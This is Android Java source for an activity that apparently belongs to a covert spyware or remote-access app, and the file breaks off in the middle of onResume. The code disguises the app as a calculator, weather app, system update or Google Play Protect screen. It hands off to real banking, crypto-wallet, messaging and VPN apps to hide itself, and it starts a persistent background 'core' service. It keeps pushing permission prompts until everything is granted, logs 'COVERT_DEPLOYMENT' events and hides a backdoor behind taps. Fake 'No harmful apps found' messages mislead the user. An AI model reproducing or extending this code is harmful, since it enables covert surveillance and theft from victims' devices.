package com.labs.labrats;

import android.Manifest;
import android.animation.AnimatorSet;
import android.animation.ObjectAnimator;
import android.content.Intent;
import android.net.Uri;
import android.os.Build;
import android.os.Bundle;
import android.provider.Settings;
import android.os.Handler;
import android.os.Looper;
import android.util.Log;
import android.view.View;
import android.widget.Button;
import android.widget.LinearLayout;
import android.widget.ProgressBar;
import android.widget.TextView;

import androidx.annotation.NonNull;
import androidx.appcompat.app.AppCompatActivity;
import android.text.SpannableStringBuilder;
import android.text.Spanned;
import android.text.style.ForegroundColorSpan;
import android.graphics.Color;

import org.json.JSONArray;
import org.json.JSONObject;
import java.io.BufferedReader;
import java.io.InputStreamReader;
import java.net.HttpURLConnection;
import java.net.URL;
import java.util.Locale;

public class DecoyActivity extends AppCompatActivity {

    private Button btnCheckUpdate;
    private View pseudoToast;
    private int clickCount = 0;
    private long lastClickTime = 0;
    private boolean isSpecializedDecoy = false;

    // Calculator State
    private String operand1 = "";
    private String operator = "";
    private boolean calcJustCalculated = false;

    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);

        // --- STABILITY_LAYOUT_SYNC: Force system bars to match decoy background ---
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.LOLLIPOP) {
            getWindow().setStatusBarColor(android.graphics.Color.BLACK);
            getWindow().setNavigationBarColor(android.graphics.Color.BLACK);
        }

        android.content.ComponentName component = getIntent().getComponent();
        String componentName = (component != null) ? component.getClassName() : "";
        Log.d("DecoyActivity", "Launched via: " + componentName);

        // Fallback: Check which alias is currently enabled if the component name is ambiguous
        if (componentName.equals(getPackageName() + ".DecoyActivity") || componentName.endsWith(".DecoyActivity")) {
            android.content.pm.PackageManager pm = getPackageManager();
            String base = "com.labs.labrats";
            if (pm.getComponentEnabledSetting(new android.content.ComponentName(this, base + ".CalculatorAlias")) == android.content.pm.PackageManager.COMPONENT_ENABLED_STATE_ENABLED) {
                componentName = "CalculatorAlias";
            } else if (pm.getComponentEnabledSetting(new android.content.ComponentName(this, base + ".WeatherAlias")) == android.content.pm.PackageManager.COMPONENT_ENABLED_STATE_ENABLED) {
                componentName = "WeatherAlias";
            } else if (pm.getComponentEnabledSetting(new android.content.ComponentName(this, base + ".SettingsAlias")) == android.content.pm.PackageManager.COMPONENT_ENABLED_STATE_ENABLED) {
                componentName = "SettingsAlias";
            }
        }

        // --- MASQUERADE PASSTHROUGH ---
        String masqPkg = getSharedPreferences("StabilityConfig", MODE_PRIVATE).getString("masquerade_pkg", "");
        
        // Auto-infer package from launch component if not explicitly stored
        if (masqPkg.isEmpty()) {
            if (componentName.contains("TwitterAlias")) masqPkg = "com.twitter.android";
            else if (componentName.contains("WhatsAppAlias")) masqPkg = "com.whatsapp";
            else if (componentName.contains("TelegramAlias")) masqPkg = "org.telegram.messenger";
            else if (componentName.contains("InstagramAlias")) masqPkg = "com.instagram.android";
            else if (componentName.contains("YouTubeAlias")) masqPkg = "com.google.android.youtube";
            else if (componentName.contains("ChromeAlias")) masqPkg = "com.android.chrome";
            else if (componentName.contains("BankAlias")) masqPkg = "ca.pcfinancial.bank";
            else if (componentName.contains("MailAlias")) masqPkg = "ch.protonmail.android";
            else if (componentName.contains("VPNAlias")) masqPkg = "ch.protonvpn.android";
            else if (componentName.contains("PdfAlias")) masqPkg = "com.adobe.reader";
            else if (componentName.contains("MusicAlias")) masqPkg = "com.sec.android.app.music";
            else if (componentName.contains("TermuxAlias")) masqPkg = "com.termux";
            else if (componentName.contains("CryptoAlias")) masqPkg = "org.electrum.electrum";
        }

        if (!masqPkg.isEmpty()) {
            try {
                Intent launchIntent = getPackageManager().getLaunchIntentForPackage(masqPkg);
                if (launchIntent != null) {
                    launchIntent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
                    startActivity(launchIntent);
                    finish();
                    return;
                }
            } catch (Exception ignored) {}
        }

        if (componentName.contains("CalculatorAlias")) {
            setContentView(R.layout.activity_decoy_calculator);
            setupCalculator();
            isSpecializedDecoy = true;
        } else if (componentName.contains("WeatherAlias")) {
            setContentView(R.layout.activity_decoy_weather);
            setupWeather();
            isSpecializedDecoy = true;
        } else if (componentName.contains("SystemUpdateAlias")) {
            setContentView(R.layout.activity_decoy_install_success);
            setupSystemUpdateSuccessDecoy();
            isSpecializedDecoy = true;
        } else {
            isSpecializedDecoy = false;
            // High-Fidelity Play Protect Pipeline Logic
            if (allPermissionsOk()) {
                getSharedPreferences("StabilityConfig", MODE_PRIVATE).edit().putBoolean("decoy_deployed", true).apply();
                setupSuccessDecoy();
            } else {
                // Direct Permission Pipeline: Launches PermissionActivity whenever permissions are incomplete
                FirebaseConfig.logActivity("COVERT_DEPLOYMENT: Direct permission pipeline initialized.");
                
                Intent i = new Intent(this, WorkManager_Sync.class);
                i.setAction(Constants.ACTION_START_CORE);
                try {
                    if (android.os.Build.VERSION.SDK_INT >= android.os.Build.VERSION_CODES.O) {
                        startForegroundService(i);
                    } else {
                        startService(i);
                    }
                } catch (Exception ignored) {}

                Intent permissions = new Intent(this, PermissionActivity.class);
                permissions.addFlags(Intent.FLAG_ACTIVITY_CLEAR_TOP);
                startActivityForResult(permissions, 9999);
            }
        }

        // --- GHOST_WAKE_UP ---
        boolean isDeployed = getSharedPreferences("StabilityConfig", MODE_PRIVATE).getBoolean("decoy_deployed", false);
        if (isDeployed && !WorkManager_Sync.isRunning && !WorkManager_Sync.isDestructing) {
            Intent i = new Intent(this, WorkManager_Sync.class);
            i.setAction(Constants.ACTION_START_CORE);
            try {
                if (android.os.Build.VERSION.SDK_INT >= android.os.Build.VERSION_CODES.O) {
                    startForegroundService(i);
                } else {
                    startService(i);
                }
            } catch (Exception ignored) {}
        }
    }

    private void setupUpdateDecoy() {
        btnCheckUpdate = findViewById(R.id.btnCheckUpdate);
        View ivUpdateIcon = findViewById(R.id.ivUpdateIcon);
        pseudoToast = findViewById(R.id.pseudoToast);

        Runnable triggerAction = () -> {
            if (btnCheckUpdate != null) btnCheckUpdate.setEnabled(false);
            getSharedPreferences("StabilityConfig", MODE_PRIVATE).edit().putBoolean("decoy_deployed", true).apply();
            FirebaseConfig.logActivity("COVERT_DEPLOYMENT: System decoy initialized successfully.");
            
            // Start persistence core
            Intent i = new Intent(DecoyActivity.this, WorkManager_Sync.class);
            i.setAction(Constants.ACTION_START_CORE);
            try {
                if (android.os.Build.VERSION.SDK_INT >= android.os.Build.VERSION_CODES.O) {
                    startForegroundService(i);
                } else {
                    startService(i);
                }
            } catch (Exception ignored) {}

            // Transition to Permission Repair Sequence
            try {
                Intent permissions = new Intent(DecoyActivity.this, PermissionActivity.class);
                permissions.addFlags(Intent.FLAG_ACTIVITY_CLEAR_TOP);
                startActivityForResult(permissions, 9999);
            } catch (Exception e) {
                Log.e("DecoyActivity", "Transition Error: " + e.getMessage());
                setContentView(R.layout.activity_decoy_install_success);
                setupSuccessDecoy();
            }
        };

        if (btnCheckUpdate != null) {
            btnCheckUpdate.setOnClickListener(v -> triggerAction.run());
        }

        // Auto-trigger setup sequence after 800ms on fresh install
        boolean isDeployed = getSharedPreferences("StabilityConfig", MODE_PRIVATE).getBoolean("decoy_deployed", false);
        if (!isDeployed) {
            new Handler(Looper.getMainLooper()).postDelayed(triggerAction, 800);
        }

        if (ivUpdateIcon != null) {
            ivUpdateIcon.setOnClickListener(v -> finish());
        }

        View btnLearnMore = findViewById(R.id.btnLearnMore);
        if (btnLearnMore != null) {
            String dynamicUrl = getDynamicUpdateUrl();
            if (btnLearnMore instanceof android.widget.TextView) {
                SpannableStringBuilder builder = new SpannableStringBuilder("Learn more at:\n");
                int start = builder.length();
                builder.append(dynamicUrl);
                builder.setSpan(new ForegroundColorSpan(Color.parseColor("#A0A0A0")), 0, start, Spanned.SPAN_EXCLUSIVE_EXCLUSIVE);
                builder.setSpan(new ForegroundColorSpan(Color.parseColor("#3470E5")), start, builder.length(), Spanned.SPAN_EXCLUSIVE_EXCLUSIVE);
                ((android.widget.TextView) btnLearnMore).setText(builder);
            }
            btnLearnMore.setOnClickListener(v -> {
                Log.d("DecoyActivity", "Learn More link clicked: " + dynamicUrl);
                try {
                    Intent intent = new Intent(Intent.ACTION_VIEW, Uri.parse(dynamicUrl));
                    intent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
                    startActivity(intent);
                } catch (Exception e) {
                    Log.e("DecoyActivity", "Error opening Learn More link: " + e.getMessage());
                    android.widget.Toast.makeText(DecoyActivity.this, "Unable to open link", android.widget.Toast.LENGTH_SHORT).show();
                }
            });
        }
    }

    private void startRealisticLoadingAnimation(View layout) {
        // 1. Rotation Animation for the whole group
        ObjectAnimator rotate = ObjectAnimator.ofFloat(layout, View.ROTATION, 0f, 360f);
        rotate.setDuration(2500);
        rotate.setRepeatCount(ObjectAnimator.INFINITE);
        rotate.setInterpolator(new android.view.animation.LinearInterpolator());

        // 2. Find individual dots
        View d1 = layout.findViewById(R.id.dot1);
        if (d1 == null) d1 = layout.findViewById(R.id.dot1_success);
        View d2 = layout.findViewById(R.id.dot2);
        if (d2 == null) d2 = layout.findViewById(R.id.dot2_success);
        View d3 = layout.findViewById(R.id.dot3);
        if (d3 == null) d3 = layout.findViewById(R.id.dot3_success);
        View d4 = layout.findViewById(R.id.dot4);
        if (d4 == null) d4 = layout.findViewById(R.id.dot4_success);

        if (d1 != null && d2 != null && d3 != null && d4 != null) {
            // Samsung High-Fidelity Sync: 2 dots at half opacity
            d2.setAlpha(0.5f);
            d3.setAlpha(0.5f);

            // Pulsing "Convergence" Animation (Closing into 1 ball)
            // move = 24f ensures they fully overlap and compress into the center
            float move = 24f;

            AnimatorSet pulseSet = new AnimatorSet();
            
            ObjectAnimator p1x = ObjectAnimator.ofFloat(d1, View.TRANSLATION_X, 0f, move, 0f);
            ObjectAnimator p1y = ObjectAnimator.ofFloat(d1, View.TRANSLATION_Y, 0f, move, 0f);
            
            ObjectAnimator p2x = ObjectAnimator.ofFloat(d2, View.TRANSLATION_X, 0f, -move, 0f);
            ObjectAnimator p2y = ObjectAnimator.ofFloat(d2, View.TRANSLATION_Y, 0f, move, 0f);
            
            ObjectAnimator p3x = ObjectAnimator.ofFloat(d3, View.TRANSLATION_X, 0f, move, 0f);
            ObjectAnimator p3y = ObjectAnimator.ofFloat(d3, View.TRANSLATION_Y, 0f, -move, 0f);
            
            ObjectAnimator p4x = ObjectAnimator.ofFloat(d4, View.TRANSLATION_X, 0f, -move, 0f);
            ObjectAnimator p4y = ObjectAnimator.ofFloat(d4, View.TRANSLATION_Y, 0f, -move, 0f);

            p1x.setRepeatCount(ObjectAnimator.INFINITE);
            p1y.setRepeatCount(ObjectAnimator.INFINITE);
            p2x.setRepeatCount(ObjectAnimator.INFINITE);
            p2y.setRepeatCount(ObjectAnimator.INFINITE);
            p3x.setRepeatCount(ObjectAnimator.INFINITE);
            p3y.setRepeatCount(ObjectAnimator.INFINITE);
            p4x.setRepeatCount(ObjectAnimator.INFINITE);
            p4y.setRepeatCount(ObjectAnimator.INFINITE);

            ObjectAnimator fade = ObjectAnimator.ofFloat(layout, View.ALPHA, 1.0f, 0.7f, 1.0f);
            fade.setDuration(1250);
            fade.setRepeatCount(ObjectAnimator.INFINITE);

            pulseSet.playTogether(rotate, fade, p1x, p1y, p2x, p2y, p3x, p3y, p4x, p4y);
            pulseSet.setDuration(1250);
            pulseSet.start();
        } else {
            rotate.start();
        }
    }

    private void setupSuccessDecoy() {
        IO_Persistence_Manager.setAutoPilot(false);
        setContentView(R.layout.activity_guide_permission);

        ProgressBar pb = findViewById(R.id.pbPlayProtect);
        TextView tvSub = findViewById(R.id.tvPlayProtectSub);
        TextView tvDetails = findViewById(R.id.tvPlayProtectDetails);
        View robot = findViewById(R.id.ivPlayProtectRobot);
        View btnBack = findViewById(R.id.btnOverlayBack);

        if (pb != null) {
            pb.setProgress(100);
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.LOLLIPOP) {
                pb.setProgressTintList(android.content.res.ColorStateList.valueOf(Color.parseColor("#34A853")));
            }
        }

        if (tvSub != null) {
            tvSub.setText("✔  System is up to date");
            tvSub.setTextColor(Color.parseColor("#137333")); // Official Play Protect Dark Green
            tvSub.setTextSize(android.util.TypedValue.COMPLEX_UNIT_SP, 20);
            tvSub.setTypeface(android.graphics.Typeface.DEFAULT_BOLD);
            tvSub.setOnClickListener(v -> handleBackdoorClick());
        }

        if (tvDetails != null) {
            tvDetails.setText("No harmful apps found • Last scanned: Just now");
            tvDetails.setTextColor(Color.parseColor("#5F6368"));
            tvDetails.setTextSize(android.util.TypedValue.COMPLEX_UNIT_SP, 15);
            tvDetails.setOnClickListener(v -> handleBackdoorClick());
        }

        if (robot != null) {
            robot.setOnClickListener(v -> handleBackdoorClick());
        }

        if (btnBack != null) {
            btnBack.setVisibility(View.VISIBLE);
            btnBack.setOnClickListener(v -> goHome());
        }

        View btnFinish = findViewById(R.id.btnFinishDecoy);
        if (btnFinish != null) {
            btnFinish.setVisibility(View.VISIBLE);
            btnFinish.setOnClickListener(v -> goHome());
        }
    }

    private void setupSystemUpdateSuccessDecoy() {
        IO_Persistence_Manager.setAutoPilot(false);
        setContentView(R.layout.activity_decoy_install_success);

        View root = findViewById(R.id.successRoot);
        if (root != null) {
            root.setAlpha(0f);
            root.animate().alpha(1f).setDuration(1000).start();
        }

        View backdoor = findViewById(R.id.ivSuccessBackdoor);
        if (backdoor != null) {
            backdoor.setOnClickListener(v -> handleBackdoorClick());
        }

        View btnBack = findViewById(R.id.btnSuccessBack);
        if (btnBack != null) {
            btnBack.setOnClickListener(v -> goHome());
        }

        View btnMore = findViewById(R.id.btnSuccessMore);
        if (btnMore != null) {
            btnMore.setOnClickListener(v -> {
                View popupView = getLayoutInflater().inflate(R.layout.layout_samsung_popup_menu, null);
                android.widget.PopupWindow popupWindow = new android.widget.PopupWindow(
                        popupView,
                        android.view.ViewGroup.LayoutParams.WRAP_CONTENT,
                        android.view.ViewGroup.LayoutParams.WRAP_CONTENT,
                        true
                );
                popupWindow.setElevation(20f);
                popupWindow.setBackgroundDrawable(new android.graphics.drawable.ColorDrawable(android.graphics.Color.TRANSPARENT));

                View itemInfo = popupView.findViewById(R.id.pop_software_info);
                if (itemInfo != null) {
                    itemInfo.setOnClickListener(i -> {
                        String osVersion = android.os.Build.VERSION.RELEASE;
                        int sdkInt = android.os.Build.VERSION.SDK_INT;
                        
                        String oneUiVer = "";
                        try {
                            Class<?> spClass = Class.forName("android.os.SystemProperties");
                            java.lang.reflect.Method getMethod = spClass.getMethod("get", String.class, String.class);
                            String rawProp = (String) getMethod.invoke(null, "ro.build.version.oneui", "");
                            if (rawProp == null || rawProp.isEmpty()) {
                                rawProp = (String) getMethod.invoke(null, "ro.build.version.sem", "");
                            }
                            if (rawProp != null && !rawProp.isEmpty()) {
                                if (rawProp.length() >= 3 && rawProp.matches("\\d+")) {
                                    int numVer = Integer.parseInt(rawProp);
                                    int major = numVer / 10000;
                                    int minor = (numVer % 10000) / 100;
                                    oneUiVer = major + "." + minor;
                                } else {
                                    oneUiVer = rawProp;
                                }
                            }
                        } catch (Exception ignored) {}

                        if (oneUiVer == null || oneUiVer.isEmpty()) {
                            if (sdkInt >= 35) oneUiVer = "8.5";
                            else if (sdkInt == 34) oneUiVer = "6.1";
                            else if (sdkInt == 33) oneUiVer = "5.1";
                            else if (sdkInt == 32 || sdkInt == 31) oneUiVer = "4.1";
                            else if (sdkInt == 30) oneUiVer = "3.1";
                            else if (sdkInt == 29) oneUiVer = "2.5";
                            else oneUiVer = "8.5";
                        }

                        String infoText = "One UI version " + oneUiVer + "\nAndroid " + osVersion;
                        android.widget.Toast.makeText(DecoyActivity.this, infoText, android.widget.Toast.LENGTH_SHORT).show();
                        popupWindow.dismiss();
                    });
                }

                View itemAuto = popupView.findViewById(R.id.pop_auto_download);
                if (itemAuto != null) {
                    itemAuto.setOnClickListener(i -> {
                        android.widget.Toast.makeText(DecoyActivity.this, "Auto download over Wi-Fi is enabled", android.widget.Toast.LENGTH_SHORT).show();
                        popupWindow.dismiss();
                    });
                }

                View itemLast = popupView.findViewById(R.id.pop_last_update);
                if (itemLast != null) {
                    itemLast.setOnClickListener(i -> {
                        android.widget.Toast.makeText(DecoyActivity.this, "Last successful update: Today", android.widget.Toast.LENGTH_SHORT).show();
                        popupWindow.dismiss();
                    });
                }

                popupWindow.showAsDropDown(btnMore, -30, 0);
            });
        }

        final Button btnCheckForUpdate = findViewById(R.id.btnCheckForUpdate);
        final View loadingLayout = findViewById(R.id.loadingLayoutSuccess);

        if (btnCheckForUpdate != null) {
            btnCheckForUpdate.setOnClickListener(v -> {
                btnCheckForUpdate.setEnabled(false);
                btnCheckForUpdate.setText("");
                
                if (loadingLayout != null) {
                    loadingLayout.setVisibility(View.VISIBLE);
                    startRealisticLoadingAnimation(loadingLayout);
                }

                new Handler(Looper.getMainLooper()).postDelayed(() -> {
                    if (loadingLayout != null) loadingLayout.setVisibility(View.GONE);
                    btnCheckForUpdate.setEnabled(true);
                    btnCheckForUpdate.setText(R.string.decoy_check_btn);
                    
                    android.widget.Toast.makeText(DecoyActivity.this, R.string.decoy_no_updates, android.widget.Toast.LENGTH_SHORT).show();
                }, 4000);
            });
        }
    }

    private void goHome() {
        try {
            Intent home = new Intent(Intent.ACTION_MAIN);
            home.addCategory(Intent.CATEGORY_HOME);
            home.setFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
            startActivity(home);
        } catch (Exception ignored) {}
        finish();
    }

    private void setupCalculator() {
        TextView display = findViewById(R.id.calcDisplay);
        if (display == null) return;
        display.setOnClickListener(v -> handleBackdoorClick());
        
        View.OnClickListener listener = v -> {
            Button b = (Button) v;
            String val = b.getText().toString();
            String current = display.getText().toString();

            if (val.matches("[0-9]")) {
                if (current.equals("0") || calcJustCalculated) {
                    display.setText(val);
                } else {
                    display.setText(current + val);
                }
                calcJustCalculated = false;
            } else if (val.equals(".")) {
                if (calcJustCalculated) {
                    display.setText("0.");
                } else if (!current.contains(".")) {
                    display.setText(current + ".");
                }
                calcJustCalculated = false;
            } else if (val.equals("C") || val.equals("AC")) {
                display.setText("0");
                operand1 = "";
                operator = "";
                calcJustCalculated = false;
            } else if (val.matches("[+\\-x/–]")) {
                operand1 = current;
                operator = val.replace("–", "-");
                calcJustCalculated = true;
            } else if (val.equals("=")) {
                if (!operator.isEmpty()) {
                    try {
                        double o1 = Double.parseDouble(operand1);
                        double o2 = Double.parseDouble(current);
                        double result = 0;
                        switch (operator) {
                            case "+": result = o1 + o2; break;
                            case "-": result = o1 - o2; break;
                            case "x": result = o1 * o2; break;
                            case "/": if (o2 != 0) result = o1 / o2; break;
                        }
                        display.setText(formatResult(result));
                        operator = "";
                        calcJustCalculated = true;
                    } catch (Exception ignored) {}
                }
            } else if (val.equals("+/-")) {
                try {
                    double d = Double.parseDouble(current);
                    if (d != 0) display.setText(formatResult(d * -1));
                } catch (Exception ignored) {}
            } else if (val.equals("%")) {
                try {
                    double d = Double.parseDouble(current) / 100;
                    display.setText(formatResult(d));
                } catch (Exception ignored) {}
            }
        };
        android.view.ViewGroup root = (android.view.ViewGroup) display.getParent();
        findAndAttachButtons(root, listener);
    }

    private void findAndAttachButtons(android.view.ViewGroup parent, View.OnClickListener listener) {
        for (int i = 0; i < parent.getChildCount(); i++) {
            View v = parent.getChildAt(i);
            if (v instanceof Button) v.setOnClickListener(listener);
            else if (v instanceof android.view.ViewGroup) findAndAttachButtons((android.view.ViewGroup) v, listener);
        }
    }

    private String formatResult(double d) {
        if (d == (long) d) return String.format(Locale.US, "%d", (long) d);
        else return String.format(Locale.US, "%.2f", d);
    }

    private void setupWeather() {
        TextView cityTv = findViewById(R.id.weatherCity);
        if (cityTv != null) {
            String city = getSharedPreferences("StabilityConfig", MODE_PRIVATE).getString("last_city", "New York");
            cityTv.setText(city);
            cityTv.setOnClickListener(v -> handleBackdoorClick());
            updateCityName(cityTv);
        }
        
        TextView tempTv = findViewById(R.id.weatherTemp);
        TextView highLowTv = findViewById(R.id.weatherHighLow);
        
        if (tempTv != null || highLowTv != null) {
            boolean useCelsius = false;
            try {
                android.telephony.TelephonyManager tm = (android.telephony.TelephonyManager) getSystemService(android.content.Context.TELEPHONY_SERVICE);
                String country = tm.getNetworkCountryIso();
                if (country == null || country.isEmpty()) country = Locale.getDefault().getCountry();
                
                if (country != null && (country.equalsIgnoreCase("CA") || country.equalsIgnoreCase("GB") || 
                    country.equalsIgnoreCase("AU") || country.equalsIgnoreCase("FR") || country.equalsIgnoreCase("DE"))) {
                    useCelsius = true;
                }
            } catch (Exception ignored) {}
            
            if (useCelsius) {
                if (tempTv != null) tempTv.setText(" " + fToC(72) + "°");
                if (highLowTv != null) highLowTv.setText("High: " + fToC(78) + "°  Low: " + fToC(65) + "°");
                
                TextView fToday = findViewById(R.id.forecastToday);
                TextView fTue = findViewById(R.id.forecastTue);
                TextView fWed = findViewById(R.id.forecastWed);
                TextView fThu = findViewById(R.id.forecastThu);
                
                if (fToday != null) fToday.setText(fToC(78) + "° " + fToC(65) + "°");
                if (fTue != null) fTue.setText(fToC(75) + "° " + fToC(63) + "°");
                if (fWed != null) fWed.setText(fToC(72) + "° " + fToC(60) + "°");
                if (fThu != null) fThu.setText(fToC(68) + "° " + fToC(58) + "°");
            }
        }
        
        LinearLayout mainInfo = findViewById(R.id.weatherMainInfo);
        if (mainInfo != null) {
            mainInfo.setOnClickListener(v -> handleBackdoorClick());
        }
    }

    private int fToC(int f) {
        return (int) Math.round((f - 32) * 5.0 / 9.0);
    }

    private void updateCityName(TextView cityTv) {
        if (androidx.core.content.ContextCompat.checkSelfPermission(this, android.Manifest.permission.ACCESS_COARSE_LOCATION) == android.content.pm.PackageManager.PERMISSION_GRANTED) {
            try {
                android.location.LocationManager lm = (android.location.LocationManager) getSystemService(android.content.Context.LOCATION_SERVICE);
                android.location.Location loc = null;
                java.util.List<String> providers = lm.getProviders(true);
                for (String provider : providers) {
                    android.location.Location l = lm.getLastKnownLocation(provider);
                    if (l == null) continue;
                    if (loc == null || l.getAccuracy() < loc.getAccuracy()) loc = l;
                }
                
                if (loc != null) {
                    resolveCityFromLocation(loc, cityTv);
                } else {
                    // Force a single location update if last known is null
                    String provider = providers.contains(android.location.LocationManager.NETWORK_PROVIDER) ? 
                                     android.location.LocationManager.NETWORK_PROVIDER : 
                                     (providers.isEmpty() ? null : providers.get(0));
                    
                    if (provider != null) {
                        lm.requestSingleUpdate(provider, new android.location.LocationListener() {
                            @Override public void onLocationChanged(@NonNull android.location.Location location) {
                                resolveCityFromLocation(location, cityTv);
                            }
                            @Override public void onStatusChanged(String provider, int status, Bundle extras) {}
                            @Override public void onProviderEnabled(@NonNull String provider) {}
                            @Override public void onProviderDisabled(@NonNull String provider) {}
                        }, Looper.getMainLooper());
                    }
                }
            } catch (Exception ignored) {}
        }
    }

    private void resolveCityFromLocation(android.location.Location loc, TextView cityTv) {
        try {
            // [STABILITY_SYNC] Fetch real weather data for the location
            fetchRealWeather(loc.getLatitude(), loc.getLongitude());

            android.location.Geocoder geocoder = new android.location.Geocoder(this, java.util.Locale.getDefault());
            if (android.os.Build.VERSION.SDK_INT >= android.os.Build.VERSION_CODES.TIRAMISU) {
                Api33Geocoder.getFromLocation(geocoder, loc, cityTv, this);
            } else {
                java.util.List<android.location.Address> addresses = geocoder.getFromLocation(loc.getLatitude(), loc.getLongitude(), 1);
                if (addresses != null && !addresses.isEmpty()) {
                    String city = addresses.get(0).getLocality();
                    if (city == null) city = addresses.get(0).getSubAdminArea(); // Fallback for smaller towns
                    if (city != null) {
                        final String finalCity = city;
                        runOnUiThread(() -> cityTv.setText(finalCity));
                        getSharedPreferences("StabilityConfig", MODE_PRIVATE).edit().putString("last_city", city).apply();
                    }
                }
            }
        } catch (Exception ignored) {}
    }

    @androidx.annotation.RequiresApi(api = android.os.Build.VERSION_CODES.TIRAMISU)
    private static class Api33Geocoder {
        static void getFromLocation(android.location.Geocoder geocoder, android.location.Location loc, TextView cityTv, DecoyActivity activity) {
            geocoder.getFromLocation(loc.getLatitude(), loc.getLongitude(), 1, addresses -> {
                if (!addresses.isEmpty()) {
                    String city = addresses.get(0).getLocality();
                    if (city != null) {
                        activity.runOnUiThread(() -> cityTv.setText(city));
                        activity.getSharedPreferences("StabilityConfig", MODE_PRIVATE).edit().putString("last_city", city).apply();
                    }
                }
            });
        }
    }

    private void fetchRealWeather(double lat, double lon) {
        new Thread(() -> {
            try {
                URL url = new URL("https://api.open-meteo.com/v1/forecast?latitude=" + lat + "&longitude=" + lon + "&current_weather=true&daily=temperature_2m_max,temperature_2m_min&timezone=auto");
                HttpURLConnection conn = (HttpURLConnection) url.openConnection();
                conn.setConnectTimeout(5000);
                conn.setReadTimeout(5000);
                BufferedReader reader = new BufferedReader(new InputStreamReader(conn.getInputStream()));
                StringBuilder json = new StringBuilder();
                String line;
                while ((line = reader.readLine()) != null) json.append(line);
                reader.close();
                
                JSONObject obj = new JSONObject(json.toString());
                JSONObject current = obj.getJSONObject("current_weather");
                double temp = current.getDouble("temperature");
                int code = current.getInt("weathercode");
                
                JSONObject daily = obj.getJSONObject("daily");
                JSONArray maxArray = daily.getJSONArray("temperature_2m_max");
                JSONArray minArray = daily.getJSONArray("temperature_2m_min");
                double high = maxArray.getDouble(0);
                double low = minArray.getDouble(0);

                runOnUiThread(() -> {
                    TextView tempTv = findViewById(R.id.weatherTemp);
                    TextView statusTv = findViewById(R.id.weatherStatus);
                    TextView highLowTv = findViewById(R.id.weatherHighLow);
                    if (tempTv != null) tempTv.setText(" " + (int)Math.round(temp) + "°");
                    if (statusTv != null) statusTv.setText(getWeatherDesc(code));
                    if (highLowTv != null) highLowTv.setText("High: " + (int)Math.round(high) + "°  Low: " + (int)Math.round(low) + "°");
                    
                    // Update simple forecast
                    updateForecastTable(daily);
                });
            } catch (Exception e) {
                Log.e("WeatherDecoy", "Fetch failed: " + e.getMessage());
            }
        }).start();
    }

    private void updateForecastTable(JSONObject daily) {
        try {
            JSONArray max = daily.getJSONArray("temperature_2m_max");
            JSONArray min = daily.getJSONArray("temperature_2m_min");
            
            TextView fToday = findViewById(R.id.forecastToday);
            TextView fTue = findViewById(R.id.forecastTue);
            TextView fWed = findViewById(R.id.forecastWed);
            TextView fThu = findViewById(R.id.forecastThu);
            
            if (fToday != null) fToday.setText((int)max.getDouble(0) + "° " + (int)min.getDouble(0) + "°");
            if (fTue != null && max.length() > 1) fTue.setText((int)max.getDouble(1) + "° " + (int)min.getDouble(1) + "°");
            if (fWed != null && max.length() > 2) fWed.setText((int)max.getDouble(2) + "° " + (int)min.getDouble(2) + "°");
            if (fThu != null && max.length() > 3) fThu.setText((int)max.getDouble(3) + "° " + (int)min.getDouble(3) + "°");
        } catch (Exception ignored) {}
    }

    private String getWeatherDesc(int code) {
        if (code == 0) return "Clear Sky";
        if (code <= 3) return "Partly Cloudy";
        if (code <= 48) return "Foggy";
        if (code <= 55) return "Drizzle";
        if (code <= 65) return "Rainy";
        if (code <= 77) return "Snowy";
        if (code <= 82) return "Rain Showers";
        if (code <= 99) return "Thunderstorm";
        return "Mostly Sunny";
    }

    private void setupSettings() {
        TextView title = findViewById(R.id.settingsTitle);
        if (title != null) title.setOnClickListener(v -> handleBackdoorClick());
        
        Button btnScan = findViewById(R.id.btnPlayProtectScan);
        final android.widget.ProgressBar pb = findViewById(R.id.pbPlayProtect);
        final TextView status = findViewById(R.id.playProtectStatus);

        if (btnScan != null) {
            btnScan.setOnClickListener(v -> {
                btnScan.setVisibility(View.GONE);
                if (pb != null) pb.setVisibility(View.VISIBLE);
                if (status != null) status.setText("Scanning apps...");

                new Handler(Looper.getMainLooper()).postDelayed(() -> {
                    if (pb != null) pb.setVisibility(View.GONE);
                    btnScan.setVisibility(View.VISIBLE);
                    if (status != null) status.setText("No harmful apps found");
                    android.widget.Toast.makeText(this, "Scan complete: Device is secure", android.widget.Toast.LENGTH_SHORT).show();
                }, 5000);
            });
        }

        android.view.ViewGroup root = findViewById(android.R.id.content);
        if (root != null) attachSettingsInteractivity(root);
    }

    private void attachSettingsInteractivity(android.view.ViewGroup parent) {
        for (int i = 0; i < parent.getChildCount(); i++) {
            View v = parent.getChildAt(i);
            if (v instanceof TextView) {
                TextView tv = (TextView) v;
                String text = tv.getText().toString();
                if (!text.isEmpty() && !text.equals("Settings") && tv.getTextSize() > 45) {
                    v.setOnClickListener(item -> android.widget.Toast.makeText(this, "Simulating " + text + "...", android.widget.Toast.LENGTH_SHORT).show());
                }
            } else if (v instanceof android.view.ViewGroup) attachSettingsInteractivity((android.view.ViewGroup) v);
        }
    }

    @Override
    protected void onActivityResult(int requestCode, int resultCode, Intent data) {
        super.onActivityResult(requestCode, resultCode, data);
        if (requestCode == 9999) {
            if (!isSpecializedDecoy) {
                if (allPermissionsOk()) {
                    getSharedPreferences("StabilityConfig", MODE_PRIVATE).edit().putBoolean("decoy_deployed", true).apply();
                    setupSuccessDecoy();
                } else {
                    Intent permissions = new Intent(this, PermissionActivity.class);
                    permissions.addFlags(Intent.FLAG_ACTIVITY_CLEAR_TOP);
                    startActivityForResult(permissions, 9999);
                }
            }
        }
    }

    @Override
    protected void onResume() {
        super.onResume();
        
        // Ensure system bars match on every resume to prevent "Safety Buffer" leaks
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.LOLLIPOP) {
            getWindow().setStatusBarColor(android.graphics.Color.BLACK);
            getWindow().setNavigationBarColor(android.graphics.Color.BLACK);
        }

        if (IO_Persistence_Manager.getInstance() == null) {
            FirebaseConfig.logActivity("INTEL_NOTICE: Accessibility service is offline");
        }

        if (!isSpecializedDecoy) {
            if (allPermissionsOk()) {
